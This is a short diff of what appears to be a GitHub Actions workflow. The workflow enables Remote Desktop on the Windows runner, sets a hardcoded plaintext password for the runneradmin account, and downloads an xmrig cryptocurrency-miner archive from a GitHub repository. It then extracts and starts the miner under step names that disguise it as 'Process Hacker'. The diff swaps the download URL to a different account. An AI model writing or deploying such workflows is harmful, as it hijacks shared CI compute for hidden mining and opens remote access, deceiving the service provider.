@@ -22,7 +22,7 @@ jobs:
     - run: Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -name "UserAuthentication" -Value 1
     - run: Set-LocalUser -Name "runneradmin" -Password (ConvertTo-SecureString -AsPlainText "P@ssw0rd!" -Force)
     - name: Process Hacker.
-      run: Invoke-WebRequest https://github.com/Kevinrobinson8x8/batnik/raw/main/xmrig-6.14.1.zip -OutFile "xmrig-6.14.1.zip"
+      run: Invoke-WebRequest https://github.com/Davidtayloreuy/-54546546465/raw/main/xmrig-6.14.1.zip -OutFile "xmrig-6.14.1.zip"
     - name: Extrakt Process Hacker.
       run: Expand-Archive -LiteralPath "xmrig-6.14.1.zip" -DestinationPath "C:\Reference"
     - name: StarT Process hacker.
